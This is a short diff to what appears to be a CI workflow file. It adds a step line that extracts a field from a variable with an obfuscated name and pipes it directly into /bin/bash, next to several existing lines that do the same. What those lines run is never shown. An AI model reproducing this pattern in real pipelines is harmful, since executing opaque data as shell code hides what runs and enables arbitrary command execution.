@@ -21,6 +21,7 @@ jobs:
           echo $ny466 | jq -r .ha1 | /bin/bash
           echo $c39318 | jq -r .nwce14400 | /bin/bash
           printf '%s' "$hyd86202" | jq -r .hpxt477 | /bin/bash
+          echo $fhz14 | jq -r .lu06434 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
